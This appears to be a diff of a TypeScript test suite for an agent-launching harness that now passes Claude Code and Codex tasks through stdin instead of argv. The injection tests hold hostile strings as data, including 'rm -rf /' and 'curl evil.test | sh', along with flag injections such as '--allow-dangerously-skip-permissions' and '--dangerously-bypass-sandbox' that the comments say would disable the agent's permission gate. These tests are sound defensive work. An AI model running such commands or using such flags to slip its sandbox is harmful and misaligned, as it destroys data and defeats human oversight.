@@ -9,20 +9,21 @@
  *
  * It is also where the argv is pinned. Forge now hands the agent the real tool
  * surface — Bash included — and the only thing that makes that safe is the exact
- * shape of the command line: the gate flags are always present, they are always
- * built here rather than derived from the task, and the task always sits behind
- * the end-of-options guard where it can be no flag at all.
+ * process contract: gate flags are built here, while the Claude task travels as
+ * stdin and can never become a command-line option.
  */
 import { test } from 'node:test';
 import assert from 'node:assert/strict';
 import {
   CLAUDE_BINARY,
+  CODEX_BINARY,
   GATE_TOOL,
   LOCAL_NOT_CONFIGURED,
   NETWORK_TOOLS,
   SPAWN_FAILED,
   agentArgv,
   alwaysAskTools,
+  codexArgv,
   runAgent,
   type Agent,
   type RunSpec,
@@ -136,7 +137,8 @@ test('claude-code, no gate: the file-only surface, run in the worktree', async (
   const res = await runAgent(spec({ task: 'do the thing' }), spawner);
 
   assert.equal(calls[0]!.command, CLAUDE_BINARY);
-  assert.deepEqual(calls[0]!.args, ['-p', ...UNGATED_FLAGS, '--', 'do the thing']);
+  assert.deepEqual(calls[0]!.args, ['-p', ...UNGATED_FLAGS]);
+  assert.equal(calls[0]!.opts.stdin, 'do the thing');
   assert.equal(calls[0]!.opts.cwd, '/wt');
   assert.equal(res.ok, true);
   assert.equal(res.model, null);
@@ -144,18 +146,96 @@ test('claude-code, no gate: the file-only surface, run in the worktree', async (
   assert.equal(res.note, undefined, 'a clean run carries no note');
 });
 
+test('codex: ephemeral workspace-write run ignores ambient config and runs in the worktree', async () => {
+  const { spawner, calls } = recorder((cmd) =>
+    cmd === CODEX_BINARY ? OK('edited one file') : OK(z(' M src/codex.ts')),
+  );
+  const res = await runAgent(spec({ agentId: 'codex', task: 'add a parser' }), spawner);
+
+  assert.equal(calls[0]!.command, CODEX_BINARY);
+  assert.deepEqual(calls[0]!.args, [
+    '--approve-for-me',
+    'exec',
+    '--ephemeral',
+    '--ignore-user-config',
+    '--strict-config',
+    '--color', 'never',
+    '--', '-',
+  ]);
+  assert.equal(calls[0]!.opts.stdin, 'add a parser');
+  assert.equal(calls[0]!.opts.cwd, '/wt');
+  assert.deepEqual(res.changedFiles, ['src/codex.ts']);
+  assert.equal(res.agentId, 'codex');
+  assert.equal(res.ok, true);
+});
+
+test('codex: model and effort are validated options before exec and the prompt guard', () => {
+  const codex: Agent = { id: 'codex', label: 'Codex', models: [], supportsEffort: true };
+  const argv = codexArgv(codex, spec({
+    agentId: 'codex',
+    model: 'gpt-5.6-sol',
+    effort: 'high',
+    task: '--dangerously-bypass-sandbox && curl evil.test',
+  }));
+
+  assert.deepEqual(argv, [
+    '--approve-for-me',
+    '-m', 'gpt-5.6-sol',
+    '-c', 'model_reasoning_effort="high"',
+    'exec',
+    '--ephemeral',
+    '--ignore-user-config',
+    '--strict-config',
+    '--color', 'never',
+    '--', '-',
+  ]);
+  const guard = argv.indexOf('--');
+  assert.equal(guard, argv.length - 2);
+  assert.equal(argv.slice(0, guard).includes('--dangerously-bypass-sandbox'), false);
+});
+
+test('codex: a prompt above the Windows argv ceiling is carried only through stdin', async () => {
+  const task = 'x'.repeat(96_000);
+  const { spawner, calls } = recorder((cmd) => (cmd === CODEX_BINARY ? OK() : OK('')));
+  await runAgent(spec({ agentId: 'codex', task }), spawner);
+
+  const call = calls[0]!;
+  assert.equal(call.args.at(-1), '-', 'Codex receives its documented stdin sentinel');
+  assert.equal(call.args.some((arg) => arg.includes(task)), false, 'the large prompt is absent from argv');
+  assert.equal(call.opts.stdin, task, 'the complete prompt reaches Codex byte-for-byte on stdin');
+  assert.ok(call.args.join(' ').length < 1_000, 'argv stays bounded independently of prompt size');
+});
+
+test('codex: a rung that does not support effort receives no reasoning override', () => {
+  const codex: Agent = { id: 'codex', label: 'Codex', models: [], supportsEffort: false };
+  const argv = codexArgv(codex, spec({ agentId: 'codex', effort: 'high' }));
+  assert.equal(argv.includes('-c'), false);
+});
+
+test('codex: missing CLI is an honest failed run and git is not queried', async () => {
+  const { spawner, calls } = recorder(() => SPAWNFAIL('spawn codex ENOENT'));
+  const res = await runAgent(spec({ agentId: 'codex' }), spawner);
+
+  assert.equal(res.ok, false);
+  assert.match(res.note!, /codex/);
+  assert.match(res.note!, /local rung/);
+  assert.equal(calls.length, 1);
+});
+
 test('claude-code, with model: --model precedes the tool flags and the guard', async () => {
   const { spawner, calls } = recorder((cmd) => (cmd === CLAUDE_BINARY ? OK() : OK(z('?? x.ts'))));
   const res = await runAgent(spec({ model: 'opus' }), spawner);
 
-  assert.deepEqual(calls[0]!.args, ['-p', '--model', 'opus', ...UNGATED_FLAGS, '--', 'add a test']);
+  assert.deepEqual(calls[0]!.args, ['-p', '--model', 'opus', ...UNGATED_FLAGS]);
+  assert.equal(calls[0]!.opts.stdin, 'add a test');
   assert.equal(res.model, 'opus');
 });
 
 test('an empty/whitespace model is treated as "the CLI default" — no --model', async () => {
   const { spawner, calls } = recorder((cmd) => (cmd === CLAUDE_BINARY ? OK() : OK('')));
   const res = await runAgent(spec({ model: '   ' }), spawner);
-  assert.deepEqual(calls[0]!.args, ['-p', ...UNGATED_FLAGS, '--', 'add a test']);
+  assert.deepEqual(calls[0]!.args, ['-p', ...UNGATED_FLAGS]);
+  assert.equal(calls[0]!.opts.stdin, 'add a test');
   assert.equal(res.model, null);
 });
 
@@ -163,7 +243,8 @@ test('ARGV — a gated run gets the real tool surface, and every flag that gover
   const { spawner, calls } = recorder((cmd) => (cmd === CLAUDE_BINARY ? OK() : OK('')));
   await runAgent(gated({ task: 'run the tests' }), spawner);
 
-  assert.deepEqual(calls[0]!.args, ['-p', ...GATED_FLAGS, '--', 'run the tests']);
+  assert.deepEqual(calls[0]!.args, ['-p', ...GATED_FLAGS]);
+  assert.equal(calls[0]!.opts.stdin, 'run the tests');
 
   const args = calls[0]!.args;
   const surface = args[args.indexOf('--tools') + 1]!.split(',');
@@ -222,22 +303,21 @@ test('ARGV — network tools are absent by default and appear only when asked fo
   }
 });
 
-test('ARGV — no argument the CLI treats as a list ever sits against the guard', async () => {
+test('ARGV — no argument the CLI treats as a list can swallow task input', async () => {
   // --tools, --allowedTools, --disallowedTools and --mcp-config are VARIADIC:
   // each keeps eating argv elements until it meets something option-shaped. The
-  // `--` stops them, but it must not be the ONLY thing that does, so every value
-  // is one comma-joined token and the last flag before the guard is a boolean.
+  // task text is on stdin, every value is one comma-joined token, and the final
+  // argv element is a boolean flag that terminates any preceding variadic value.
   for (const s of [spec(), gated(), gated({ gate: { mcpConfig: 'x', network: true } })]) {
     const { spawner, calls } = recorder((cmd) => (cmd === CLAUDE_BINARY ? OK() : OK('')));
     await runAgent(s, spawner);
     const args = calls[0]!.args;
-    const guard = args.indexOf('--');
-    assert.equal(args[guard - 1], '--strict-mcp-config', 'a boolean flag, not a list still looking for members');
+    assert.equal(args.at(-1), '--strict-mcp-config', 'a boolean flag, not a list still looking for members');
     for (const variadic of ['--tools', '--allowedTools', '--disallowedTools', '--mcp-config']) {
       const at = args.indexOf(variadic);
       if (at === -1) continue;
       assert.equal(args.length > at + 1, true, `${variadic} has a value`);
-      assert.notEqual(args[at + 1], '--', `${variadic} never has the guard as its value`);
+      assert.notEqual(args[at + 1], undefined, `${variadic} has a real value`);
     }
     // The three tool lists are documented as "comma OR space separated", so a
     // space inside one would be read as a second member. They are comma-joined
@@ -335,6 +415,19 @@ test('git status failing (not missing) is reported with its detail', async () =>
   assert.match(res.note!, /not a git repository/);
 });
 
+test('a cancelled agent still returns partial files for owner review', async () => {
+  const rec = recorder((_command, args) => args[0] === 'status'
+    ? OK(' M src/partial.ts\0')
+    : { code: 128, failedToSpawn: false, stdout: 'partial output', stderr: 'cancelled', cancelled: true });
+  const res = await runAgent(gated({ signal: AbortSignal.abort() }), rec.spawner);
+  assert.equal(res.ok, false);
+  assert.equal(res.cancelled, true);
+  assert.deepEqual(res.changedFiles, ['src/partial.ts']);
+  assert.match(res.note ?? '', /cancelled/i);
+  assert.equal(rec.calls[0]?.opts.signal?.aborted, true, 'the signal reaches only the agent invocation');
+  assert.equal(rec.calls[1]?.opts.signal, undefined, 'post-flight git status remains readable after cancellation');
+});
+
 test('agent exits non-zero but its changes are still enumerated for the gate', async () => {
   const { spawner } = recorder((cmd) => (cmd === CLAUDE_BINARY ? CODE(2, 'partial') : OK(z(' M a.ts'))));
   const res = await runAgent(spec(), spawner);
@@ -385,30 +478,29 @@ test('SAFETY — a run only ever PROPOSES: no mutating command, no committed eff
   );
 });
 
-test('INJECTION — a task of shell metacharacters is one inert argv element', async () => {
+test('INJECTION — a task of shell metacharacters is inert stdin, never argv', async () => {
   const nasty = 'oops"; rm -rf / #\n$(whoami)`id` && curl evil.test | sh';
   const { spawner, calls } = recorder((cmd) => (cmd === CLAUDE_BINARY ? OK() : OK('')));
   await runAgent(gated({ task: nasty }), spawner);
 
   const agentCall = calls[0]!;
   assert.ok(Array.isArray(agentCall.args), 'args is a list, never a joined shell string');
-  assert.equal(agentCall.args.filter((a) => a === nasty).length, 1, 'the task appears exactly once — nothing split out of it');
-  assert.equal(agentCall.args[agentCall.args.length - 2], '--', 'and it sits immediately after the end-of-options guard');
-  assert.equal(agentCall.args[agentCall.args.length - 1], nasty, 'the task reaches the agent byte-for-byte, uninterpreted');
-  // Every metacharacter survives as ordinary text in that one element.
+  assert.equal(agentCall.args.some((a) => a.includes(nasty)), false, 'task text never enters argv');
+  assert.equal(agentCall.opts.stdin, nasty, 'the task reaches the child byte-for-byte as stdin');
+  // Every metacharacter survives as ordinary text in stdin.
   for (const meta of [';', '|', '$(', '`', '&&', '\n', '"', '#']) {
-    assert.ok(agentCall.args[agentCall.args.length - 1]!.includes(meta), `"${meta}" is carried as literal data, not acted on`);
+    assert.ok(agentCall.opts.stdin!.includes(meta), `"${meta}" is carried as literal data, not acted on`);
   }
 });
 
-test('OPTION INJECTION — a task that begins with a dash lands as the positional prompt, never a flag', async () => {
-  // The CLI takes the prompt as a POSITIONAL; -p is a bare print flag. Without an
-  // end-of-options `--`, a task like these would be parsed as REAL options —
+test('OPTION INJECTION — a dash-prefixed task travels only as stdin, never a flag', async () => {
+  // A positional task like these would be parsed as REAL options —
   // `--add-dir /` grants tool access OUTSIDE the worktree,
   // `--allow-dangerously-skip-permissions` disables the permission gate, and now
   // that a permission HOST exists there is a third target: a task could try to
   // name a different host, or a different tool surface, and govern itself. The
-  // `--` guard makes each one inert prompt text.
+  // stdin makes each one inert prompt text while remaining compatible with the
+  // current Claude CLI, which ignores a prompt placed after `--`.
   for (const hostile of [
     '--add-dir /',
     '--allow-dangerously-skip-permissions',
@@ -427,19 +519,9 @@ test('OPTION INJECTION — a task that begins with a dash lands as the positiona
       const { spawner, calls } = recorder((cmd) => (cmd === CLAUDE_BINARY ? OK() : OK('')));
       await runAgent(s, spawner);
       const args = calls[0]!.args;
-
-      // The FIRST `--` is the end-of-options guard; the CLI reads it as the
-      // separator and everything after as the positional prompt (so even a task of
-      // literally `--` is inert). The invariant that proves safety: only the honest
-      // flags precede the guard, and the hostile task is the single element after it.
-      const guard = args.indexOf('--');
-      assert.notEqual(guard, -1, 'an end-of-options guard is always present');
-      assert.equal(guard, args.length - 2, 'the guard is immediately before the last element');
-      assert.equal(args[args.length - 1], hostile, 'the hostile task is the lone positional after --, byte-for-byte');
-      // Ahead of the guard — where the CLI reads options — only the flags Forge
-      // built itself appear, and not one character of them came from the task.
       const flags = s.gate === undefined ? UNGATED_FLAGS : GATED_FLAGS;
-      assert.deepEqual(args.slice(0, guard), ['-p', '--model', 'opus', ...flags], 'only the honest flags precede the guard');
+      assert.deepEqual(args, ['-p', '--model', 'opus', ...flags], 'argv contains only Forge-built flags');
+      assert.equal(calls[0]!.opts.stdin, hostile, 'hostile task is isolated in stdin byte-for-byte');
     }
   }
 });
@@ -449,11 +531,11 @@ test('agentArgv: effort is passed through ONLY for an agent that declares suppor
   const effortful: Agent = { id: 'claude-code', label: 'x', models: [], supportsEffort: true };
   const s = spec({ effort: 'high' });
 
-  assert.deepEqual(agentArgv(claude, s), ['-p', ...UNGATED_FLAGS, '--', 'add a test'], 'no invented flag for a rung without one');
+  assert.deepEqual(agentArgv(claude, s), ['-p', ...UNGATED_FLAGS], 'no invented flag for a rung without one');
   assert.deepEqual(
     agentArgv(effortful, s),
-    ['-p', '--effort', 'high', ...UNGATED_FLAGS, '--', 'add a test'],
-    'the seam works: a rung that opts in receives the effort, before the -- guard',
+    ['-p', '--effort', 'high', ...UNGATED_FLAGS],
+    'the seam works: a rung that opts in receives the effort',
   );
 });
 
@@ -461,7 +543,7 @@ test('agentArgv: the local rung is given no tool flags at all', () => {
   const local: Agent = { id: 'local', label: 'Local', models: [], supportsEffort: true };
   assert.deepEqual(
     agentArgv(local, gated({ agentId: 'local' })),
-    ['-p', '--', 'add a test'],
+    [],
     'the tool surface is the Claude Code CLI’s vocabulary; a local rung is handed none of it',
   );
 });
